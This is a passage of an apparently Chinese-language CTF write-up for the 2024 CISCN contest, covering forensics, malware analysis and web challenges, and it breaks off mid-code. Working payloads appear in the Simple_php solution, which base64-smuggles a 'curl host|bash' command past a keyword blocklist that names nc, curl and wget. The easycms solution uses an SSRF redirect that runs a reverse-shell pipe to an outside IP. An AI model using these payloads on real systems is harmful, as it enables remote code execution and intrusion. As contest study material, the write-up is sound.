class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">w:t</span>&gt;</span>这<span class="hljs-tag">&lt;/<span class="hljs-name">w:t</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">w:t</span>&gt;</span>o<span class="hljs-tag">&lt;/<span class="hljs-name">w:t</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">w:t</span>&gt;</span>ffset:10<span class="hljs-tag">&lt;/<span class="hljs-name">w:t</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">w:t</span>&gt;</span>里<span class="hljs-tag">&lt;/<span class="hljs-name">w:t</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">w:t</span>&gt;</span>原来似乎有什么，后来好像被小C<span class="hljs-tag">&lt;/<span class="hljs-name">w:t</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">w:t</span>&gt;</span>aesar<span class="hljs-tag">&lt;/<span class="hljs-name">w:t</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">w:t</span>&gt;</span>抱走了！<span class="hljs-tag">&lt;/<span class="hljs-name">w:t</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">w:t</span>&gt;</span>mQPinNS6Xtm1JGJs<span class="hljs-tag">&lt;/<span class="hljs-name">w:t</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在PPT中打开宏编辑器</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs vb"><span class="hljs-keyword">Sub</span> crypto(sMessage, strKey)<br>    <span class="hljs-keyword">Dim</span> kLen, x, y, i, j, temp<br>    <span class="hljs-keyword">Dim</span> s(<span class="hljs-number">256</span>), k(<span class="hljs-number">256</span>)<br><br>    kLen = Len(strKey)<br>    <span class="hljs-keyword">For</span> i = <span class="hljs-number">0</span> <span class="hljs-keyword">To</span> <span class="hljs-number">255</span><br>        s(i) = i<br>        k(i) = Asc(<span class="hljs-keyword">Mid</span>(strKey, (i <span class="hljs-built_in">Mod</span> kLen) + <span class="hljs-number">1</span>, <span class="hljs-number">1</span>))<br>    <span class="hljs-keyword">Next</span><br><br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">For</span> i = <span class="hljs-number">0</span> <span class="hljs-keyword">To</span> <span class="hljs-number">255</span><br>        j = (j + k(i) + s(i)) <span class="hljs-built_in">Mod</span> <span class="hljs-number">256</span><br>        temp = s(i)<br>        s(i) = s(j)<br>        s(j) = temp<br>    <span class="hljs-keyword">Next</span><br><br>    x = <span class="hljs-number">0</span><br>    y = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">For</span> i = <span class="hljs-number">1</span> <span class="hljs-keyword">To</span> <span class="hljs-number">3072</span><br>        x = (x + <span class="hljs-number">1</span>) <span class="hljs-built_in">Mod</span> <span class="hljs-number">256</span><br>        y = (y + s(x)) <span class="hljs-built_in">Mod</span> <span class="hljs-number">256</span><br>        temp = s(x)<br>        s(x) = s(y)<br>        s(y) = temp<br>    <span class="hljs-keyword">Next</span><br><br>    <span class="hljs-keyword">For</span> i = <span class="hljs-number">1</span> <span class="hljs-keyword">To</span> Len(sMessage)<br>        x = (x + <span class="hljs-number">1</span>) <span class="hljs-built_in">Mod</span> <span class="hljs-number">256</span><br>        y = (y + s(x)) <span class="hljs-built_in">Mod</span> <span class="hljs-number">256</span><br>        temp = s(x)<br>        s(x) = s(y)<br>        s(y) = temp<br><br>        crypto = crypto &amp; (s((s(x) + s(y)) <span class="hljs-built_in">Mod</span> <span class="hljs-number">256</span>) <span class="hljs-built_in">Xor</span> Asc(<span class="hljs-keyword">Mid</span>(sMessage, i, <span class="hljs-number">1</span>))) &amp; <span class="hljs-string">&quot;,&quot;</span><br>    <span class="hljs-keyword">Next</span><br>    <span class="hljs-comment">&#x27;i13POMdzEAzHfy4dGS+vUA==(After base64)</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Sub</span><br></code></pre></td></tr></table></figure><p>rc4后base64得到<code>PArt3:3-34</code></p><p>将一到十部分拼接在一起：<code>flag&#123;e675efb3-346f-405f-90dd-222b387edee9&#125;</code></p><h2 id="通风机"><a href="#通风机" class="headerlink" title="通风机"></a>通风机</h2><p>修补文件头，加上<code>GJK</code>后用<code>STEP 7 Micro/WIN</code>打开</p><p>符号表里注释的字符串base64得到flag</p><p><img src="/img/wp/2024/2024ciscn-%E9%80%9A%E9%A3%8E%E6%9C%BA-1.png"></p><h2 id="盗版软件"><a href="#盗版软件" class="headerlink" title="盗版软件"></a>盗版软件</h2><p>运行hackexe.exe会生成<code>loader.exe</code>和<code>output.png</code></p><p>stegsolve发现图片在红色通道每隔一位组合起来是zip，写脚本提取出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>a=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;output.png&#x27;</span>)<br>b=<span class="hljs-built_in">list</span>(a.getdata())<br>e=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(b),<span class="hljs-number">2</span>):<br>    e.append(b[i][<span class="hljs-number">0</span>])<br><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.zip&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>f.write(<span class="hljs-built_in">bytes</span>(e))<br>f.close()<br></code></pre></td></tr></table></figure><p>解压后得到<code>.b</code>文件</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">r()J$nEA&#x27;r!!#;^5u:HM1&quot;&#x27;W(Mc*q[&lt;_/-H(eBQ_+@m$P8kMf4a[h&gt;1:e3=VX?9p=!\&gt;H[_9!-P!Q!d_;F+/NMc([U69Id&gt;ct7iR(^gBUKlR.n!/lA`!!!!iKtqeC8-.(6Mb&quot;[QMa/CV!RTk-8H6e+1!)_&gt;1l+[&#x27;ejqO2X?j\E%7($238erL9ERs6#Xpc$FkBeaMa/OZ!RPFEM[W-EMa/7R!RO,j&quot;Gf?G6!.Ga!ROtQ6!-EU6!?g3ll\Sls57!F=^&quot;@S&#x27;&#x27;W&#x27;hs8Q@r^3=WR?SaG;!&#x27;sXWM&lt;7?[m%=@Z!(i%/8\&gt;*)+T!Ns8F&amp;Q@8VuM%M=EmC9Qqfgs4&#x27;f&quot;l=^2!!!$.f\g`/F!&lt;:Sa$:.up:e`[d9ejFSs1h0^_FX^B8;Y/K]&#x27;9g`i;_=uM8s?B6!-g;i^eq%6+WJ\FCG4&quot;Ktqd;8cR(Yjlhm.!!#QBlju^Ei_;/LC&#x27;6h)8;[..\cUR+?iSZ/p],bC8;&quot;i&#x27;?A\Aj5XAOd!&quot;],16!-[7njkLW6+U0o;s&quot;&amp;08;Y5UM8r=Fa[q?Y8;Z%kM&gt;9HK!nkY%s4)bs!.?7t6!%3&amp;!&#x27;gMa6!.k%&gt;!]_-0+Tc:eQ5m&gt;\ohmb@K4kLs3Bjks8W*i!Q.GW`^kgWFgOI7k?)I!=hET4.LJIugAf\<br></code></pre></td></tr></table></figure><p>对文件内容进行base85后丢到沙箱中</p><p>得到c2地址<code>39.100.72.235</code></p><p><img src="/img/wp/2024/2024ciscn-%E7%9B%97%E7%89%88%E8%BD%AF%E4%BB%B6-1.png"></p><p>然后分析<code>3842.dmp</code></p><p>使用strings搜索所有http或者ftp开头的链接</p><p><code>strings 3842.dmp | grep -iE &quot;^(http|ftp|chrome|firefox).*\.(txt|xml|png|jpg|gif|zip|rar|7z|pdf|doc|docx|php|py|flag|exe)$&quot; &gt; 1.txt</code></p><p>然后去除 baidu.com xunfei.com 这种官方网站</p><p>根据题目描述<code>在网上下了一个盗版软件</code> 很明显是<code>winhack.com</code>了</p><p><img src="/img/wp/2024/2024ciscn-%E7%9B%97%E7%89%88%E8%BD%AF%E4%BB%B6-2.png"></p><p>拼接后md5</p><p><code>winhack.com39.100.72.235</code></p><p><code>flag&#123;096e8b0f9daf10869f013c1b7efda3fd&#125;</code></p><h2 id="p-amp-p"><a href="#p-amp-p" class="headerlink" title="p&amp;p"></a>p&amp;p</h2><p>利用溢出修改flag写入文件位置，然后访问&#x2F;static&#x2F;1即可获得flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib.parse <span class="hljs-keyword">as</span> parse<br><br>url=<span class="hljs-string">&quot;http://8.147.131.163:39352/upload?name=&quot;</span>+<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">112</span>+<span class="hljs-number">16</span>+<span class="hljs-number">6</span>)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x1e</span>+<span class="hljs-string">&#x27;static/1&#x27;</span><br><span class="hljs-built_in">print</span>(url)<br>r=requests.get(url)<br>url=<span class="hljs-string">&quot;http://8.147.131.163:39352/test&quot;</span><br>r=requests.get(url)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><h2 id="Tough-DNS"><a href="#Tough-DNS" class="headerlink" title="Tough_DNS"></a>Tough_DNS</h2><blockquote><p>题目内容：DNS的世界充满了多变的字符，接下来我将直接给你答案：56 16 26 93 66 53 16 56 d2 03 26 93 56</p></blockquote><p>一打开就是大量请求一串10的数据</p><p><img src="/img/wp/2024/2024ciscn-Tough_DNS-1.png"></p><p>提取出来，开头7个1，一眼二维码</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs text">111111101100101111111<br>100000100100101000001<br>101110101010101011101<br>101110101001001011101<br>101110101110001011101<br>100000100000001000001<br>111111101010101111111<br>000000000110000000000<br>111100101010010011101<br>010010000010110111111<br>011001111000101100001<br>001110000110100001000<br>000101111001001100000<br>000000001111001110010<br>111111100100011010110<br>100000100011010000100<br>101110100001000010110<br>101110101110110100110<br>101110101011110101100<br>100000101110001111001<br>111111101111001111100<br></code></pre></td></tr></table></figure><p>扫码得到<code>15f9792dba5c</code></p><p><img src="/img/wp/2024/2024ciscn-Tough_DNS-2.png"></p><p>然后用tshark提取请求的txt字段</p><p><code>tshark -r Tough_DNS.pcapng -T json -e dns.txt -Y &quot;dns.txt&quot; &gt; 1.txt</code></p><p>分析发现每隔一位刚好组成<code>504B</code>，python提取转文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>)<br><br>d=f.read()<br>d=json.loads(d)<br><br>e1=<span class="hljs-string">&#x27;&#x27;</span><br>e2=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(d),<span class="hljs-number">2</span>):<br>    e1+=d[i][<span class="hljs-string">&#x27;_source&#x27;</span>][<span class="hljs-string">&#x27;layers&#x27;</span>][<span class="hljs-string">&#x27;dns.txt&#x27;</span>][<span class="hljs-number">0</span>]<br>    e2+=d[i+<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;_source&#x27;</span>][<span class="hljs-string">&#x27;layers&#x27;</span>][<span class="hljs-string">&#x27;dns.txt&#x27;</span>][<span class="hljs-number">0</span>]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(e1))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(e2))<br><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.bin&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>f.write(<span class="hljs-built_in">bytes</span>.fromhex(e1[<span class="hljs-number">1</span>:]))<br>f.close()<br><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;2.bin&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>f.write(<span class="hljs-built_in">bytes</span>.fromhex(e2[<span class="hljs-number">1</span>:]))<br>f.close()<br></code></pre></td></tr></table></figure><p>有两个文件，压缩包和PGP文件</p><p><img src="/img/wp/2024/2024ciscn-Tough_DNS-3.png"></p><p>解压密码是二维码的结果，解压得到<code>secret.gpg</code></p><p>用PGPTool导入secret.gpg</p><p><img src="/img/wp/2024/2024ciscn-Tough_DNS-4.png"></p><p>然后解密提取出来的文件，密码在题目描述中</p><p>根据ascii码范围，前面应该是2-7，调整位置<code>65 61 62 39 66 35 61 65 2d 30 62 39 65</code>，得到<code>eab9f5ae-0b9e</code></p><p><img src="/img/wp/2024/2024ciscn-Tough_DNS-5.png"></p><p>得到<code>flag&#123;79830a47-faf7-4067-b585-145776f833cd&#125;</code></p><p><img src="/img/wp/2024/2024ciscn-Tough_DNS-6.png"></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Simple-php"><a href="#Simple-php" class="headerlink" title="Simple_php"></a>Simple_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, <span class="hljs-string">&#x27;/var/www/html/&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>     <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>         <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br>&#125;<br>&#125;<br><br><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>没有过滤 str_replace ，那么就可以通过str_replace来绕过这一大串过滤</p><p>比如 <code>str_replace(z,count(),whozami);</code> 就可以拿到 whoami</p><p>因为题目中是system，所以再套一层<code>php -r</code>命令来反弹shell</p><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cmd=php -r <span class="hljs-title function_ invoke__">system</span>((<span class="hljs-title function_ invoke__">str_replace</span>(z,<span class="hljs-title function_ invoke__">count</span>(),bazse64_decozde))(Y3VybCA0Ny45OS43Ny41MnxiYXNo));<br></code></pre></td></tr></table></figure><p>反弹shell后目录中没有flag，通过 ps -aux 查看发现还有mysql服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND<br>root           1  0.0  0.0   2364   512 pts/0    Ss+  03:49   0:00 <span class="hljs-built_in">tail</span> -f /dev/null<br>root          27  0.0  3.8  76568 20092 ?        Ss   03:49   0:00 /usr/sbin/apache2 -k start<br>www-data      30  0.0  1.7  76592  9192 ?        S    03:49   0:00 /usr/sbin/apache2 -k start<br>www-data      31  0.0  2.5  77160 13380 ?        S    03:49   0:00 /usr/sbin/apache2 -k start<br>www-data      32  0.0  1.7  76640  9192 ?        S    03:49   0:00 /usr/sbin/apache2 -k start<br>www-data      33  0.0  2.5  76844 13196 ?        S    03:49   0:00 /usr/sbin/apache2 -k start<br>www-data      34  0.0  2.4  76648 12804 ?        S    03:49   0:00 /usr/sbin/apache2 -k start<br>root         166  0.0  0.3   2420  1620 pts/0    S+   03:49   0:00 /bin/sh /usr/bin/mysqld_safe<br>mysql        279  0.0 15.9 1083992 83680 pts/0   Sl+  03:49   0:00 /usr/sbin/mariadbd --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=mysql --skip-log-error --pid-file=/run/mysqld/mysqld.pid --socket=/run/mysqld/mysqld.sock<br>root         280  0.0  0.2   5740  1056 pts/0    S+   03:49   0:00 logger -t mysqld -p daemon error<br>root         320  0.0  0.0      0     0 pts/0    Z+   03:49   0:00 [debian-start] &lt;defunct&gt;<br></code></pre></td></tr></table></figure><p>直接 mysql -u root -proot 连接，但是没有回显，需要用错误语句来触发报错回显</p><p><img src="/img/wp/2024/2024ciscn-Simple_php-2.png"></p><p><img src="/img/wp/2024/2024ciscn-Simple_php-3.png"></p><p><img src="/img/wp/2024/2024ciscn-Simple_php-4.png"></p><p><strong>其他做法</strong></p><p>%0a绕过</p><p><code>cmd=l%0as+/</code></p><p>通过hex2bin转换</p><p><code>cmd=php+-r+eval(hex2bin(substr(aa6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d652027757365205048505f434d533b73656c656374202a2066726f6d20463161675f5365335265373b27603b,2)));</code></p><h2 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h2><p><img src="/img/wp/2024/2024ciscn-easycms-1.png"></p><p>REMOTE_ADDR绕不过去，肯定要打ssrf</p><p>后台地址被修改了，尝试爆破无果</p><p>在官方手册中找前台有远程请求的接口</p><p>最终找到一个<a href="https://www.xunruicms.com/doc/444.html">二维码函数</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">index.php?s=api&amp;c=api&amp;m=qrcode&amp;thumb=中间LOGO&amp;text=内容&amp;size=大小值&amp;level=容错率<br></code></pre></td></tr></table></figure><p><img src="/img/wp/2024/2024ciscn-easycms-2.png"></p><p>在自己的服务器上起一个flask，重定向到 <a href="http://127.0.0.1/">http://127.0.0.1/</a> cmd就能执行命令了，用ctfshow的一键反弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><br>app = Flask(__name__)<br>app.secret_key = <span class="hljs-string">&#x27;*************************&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;http://127.0.0.1/flag.php?cmd=curl%20https://your-shell.com/47.99.77.52:1234%20|%20sh&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">80</span>,debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>然后发包</p><p><code>http://eci-2ze9sa3j2fhr9odtqwsd.cloudeci1.ichunqiu.com/index.php?s=api&amp;c=api&amp;m=qrcode&amp;thumb=http://47.99.77.52/</code></p><p><img src="/img/wp/2024/2024ciscn-easycms-3.png"></p><h2 id="easycms-revenge"><a href="#easycms-revenge" class="headerlink" title="easycms_revenge"></a>easycms_revenge</h2><p>继续用上一题的payload，网页返回<code>二维码生成失败</code></p><p>猜测对参数进行了校验，修改成手册中完整的请求<code>/index.php?s=api&amp;c=api&amp;m=qrcode&amp;thumb=http://47.99.77.52/&amp;text=1&amp;size=h&amp;level=1</code></p><p>返回<code>此图片不是一张可用的图片</code>，应该是对网页的返回值进行了检查</p><p>在官网下载 迅睿CMS开发框架 查看源代码(之前看的一直是github上的项目，后来发现竟然与题目用的不一样。。。)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># dayrui\Fcms\Control\Api\Api.php</span><br><span class="hljs-comment">//生成二维码图片</span><br><span class="hljs-keyword">require_once</span> CMSPATH.<span class="hljs-string">&#x27;Library/Phpqrcode.php&#x27;</span>;<br><span class="hljs-variable">$file</span> = WRITEPATH.<span class="hljs-string">&#x27;file/qrcode-&#x27;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$value</span>.<span class="hljs-variable">$thumb</span>.<span class="hljs-variable">$matrixPointSize</span>.<span class="hljs-variable">$errorCorrectionLevel</span>).<span class="hljs-string">&#x27;-qrcodpng&#x27;</span>;<br><span class="hljs-keyword">if</span> (!IS_DEV &amp;&amp; <span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>)) &#123;<br>    <span class="hljs-variable">$QR</span> = <span class="hljs-title function_ invoke__">imagecreatefrompng</span>(<span class="hljs-variable">$file</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title class_">\QRcode</span>::<span class="hljs-title function_ invoke__">png</span>(<span class="hljs-variable">$value</span>, <span class="hljs-variable">$file</span>, <span class="hljs-variable">$errorCorrectionLevel</span>, <span class="hljs-variable">$matrixPointSize</span>, <span class="hljs-number">3</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>)) &#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;二维码生成失败&#x27;</span>);<br>    &#125;<br>    <span class="hljs-variable">$QR</span> = <span class="hljs-title function_ invoke__">imagecreatefromstring</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>));<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$thumb</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$thumb</span>, <span class="hljs-string">&#x27;https://&#x27;</span>) !== <span class="hljs-literal">false</span><br>            &amp;&amp; <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$thumb</span>, <span class="hljs-string">&#x27;/&#x27;</span>) !== <span class="hljs-literal">false</span><br>            &amp;&amp; <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$thumb</span>, <span class="hljs-string">&#x27;http://&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;图片地址不规范&#x27;</span>);<br>        &#125;<br>        <span class="hljs-variable">$img</span> = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$thumb</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$img</span>) &#123;<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;此图片不是一张可用的图片&#x27;</span>);<br>        &#125;<br>        <span class="hljs-variable">$code</span> = <span class="hljs-title function_ invoke__">dr_catcher_data</span>(<span class="hljs-variable">$thumb</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$code</span>) &#123;<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;图片参数不规范&#x27;</span>);<br>        &#125;<br>        <span class="hljs-variable">$logo</span> = <span class="hljs-title function_ invoke__">imagecreatefromstring</span>(<span class="hljs-variable">$code</span>);<br>        <span class="hljs-variable">$QR_width</span> = <span class="hljs-title function_ invoke__">imagesx</span>(<span class="hljs-variable">$QR</span>);<span class="hljs-comment">//二维码图片宽度</span><br>        <span class="hljs-variable">$logo_width</span> = <span class="hljs-title function_ invoke__">imagesx</span>(<span class="hljs-variable">$logo</span>);<span class="hljs-comment">//logo图片宽度</span><br>        <span class="hljs-variable">$logo_height</span> = <span class="hljs-title function_ invoke__">imagesy</span>(<span class="hljs-variable">$logo</span>);<span class="hljs-comment">//logo图片高度</span><br>        <span class="hljs-variable">$logo_qr_width</span> = <span class="hljs-variable">$QR_width</span> / <span class="hljs-number">4</span>;<br>        <span class="hljs-variable">$scale</span> = <span class="hljs-variable">$logo_width</span>/<span class="hljs-variable">$logo_qr_width</span>;<br>        <span class="hljs-variable">$logo_qr_height</span> = <span class="hljs-variable">$logo_height</span>/<span class="hljs-variable">$scale</span>;<br>        <span class="hljs-variable">$from_width</span> = (<span class="hljs-variable">$QR_width</span> - <span class="hljs-variable">$logo_qr_width</span>) / <span class="hljs-number">2</span>;<br>        <span class="hljs-comment">//重新组合图片并调整大小</span><br>        <span class="hljs-title function_ invoke__">imagecopyresampled</span>(<span class="hljs-variable">$QR</span>, <span class="hljs-variable">$logo</span>, (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$from_width</span>, (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$from_width</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$logo_qr_width</span>(<span class="hljs-keyword">int</span>)<span class="hljs-variable">$logo_qr_height</span>, (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$logo_width</span>, (<span 